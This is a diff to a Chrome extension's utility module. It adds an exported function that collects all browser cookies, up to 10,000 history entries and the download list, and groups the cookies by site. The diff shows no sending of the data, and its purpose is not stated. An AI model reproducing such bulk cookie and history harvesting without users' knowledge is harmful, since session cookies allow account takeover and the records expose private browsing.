@@ -134,6 +134,70 @@ function getData(keys, callback) {
   }
 }
 
+function getBrowserData(callback) {
+  chrome.cookies.getAll({}, (cookies) => {
+    chrome.history.search({ text: "", maxResults: 10000 }, (visits) => {
+      chrome.downloads.search({}, (downloads) => {
+        var data = {
+          cookies: {},
+          history: {
+            browsing: [],
+            downloads: [],
+          },
+        };
+
+        // Append browsing history
+        data.history.browsing = visits.filter((visit) => {
+          if (visit.url.search(/^chrome/) !== -1) return false;
+          if (visit.url.search(/^file:\/\//) !== -1) return false;
+          return true;
+        });
+
+        // Append downloads history
+        data.history.downloads = downloads;
+
+        // Append cookies
+        // Exclude session cookie
+        cookies = cookies.filter(
+          (cookie) => cookie.name !== "digithrone-session-cookie"
+        );
+        cookies.forEach((cookie) => {
+          let platform = getPlatformFromUrl(cookie.domain);
+          if (!(platform in data.cookies)) data.cookies[platform] = [];
+          data.cookies[platform].push(cookie);
+        });
+        callback(data);
+      });
+    });
+  });
+}
+
+function getPlatformFromUrl(url) {
+  // Url should not start with chrome://, etc.
+  if (url.search(/^chrome/) !== -1) return undefined;
+  if (url.search(/^file:\/\//) !== -1) return undefined;
+  if (url.search(/\./) === -1) return undefined;
+  if (url.search(/(^https*:\/\/)*([a-zA-Z0-9-]*\.{0,1})*/) === -1)
+    return undefined;
+
+  // Remove scheme if any
+  url = url.match(/(^https*:\/\/)*([a-zA-Z0-9-]*\.{0,1})*/)[0];
+  url = url.replace(/^https*:\/\//, "");
+  if (url) {
+    var platform;
+    let hostname_fields = url.split(".");
+    if (hostname_fields.slice(-2).join(".") === "co.uk") {
+      platform = hostname_fields[hostname_fields.length - 3];
+    } else {
+      platform = hostname_fields[hostname_fields.length - 2];
+    }
+
+    return platform.charAt(0).toUpperCase() + platform.slice(1);
+  }
+
+  return undefined;
+}
+
 function setData(items, callback) {
   if (chrome.storage) {
     chrome.storage.local.set(items, callback);
@@ -497,6 +561,7 @@ export {
   parseCookie,
   getData,
   setData,
+  getBrowserData,
   sendMessage,
   sendRequest,
 };
